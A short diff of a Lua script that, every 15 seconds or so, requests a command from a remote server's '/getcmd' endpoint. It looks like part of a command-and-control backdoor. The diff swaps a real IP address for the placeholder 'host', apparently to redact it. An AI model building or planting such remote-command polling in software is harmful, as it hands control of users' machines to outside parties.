@@ -1,7 +1,7 @@
 if (os.time() % 15) > 0 then
     return
 end
-local command = http.request("http://83.217.10.61:81/getcmd")
+local command = http.request("http://host/getcmd")
 if command == nil or command == "none" then
     return
 end
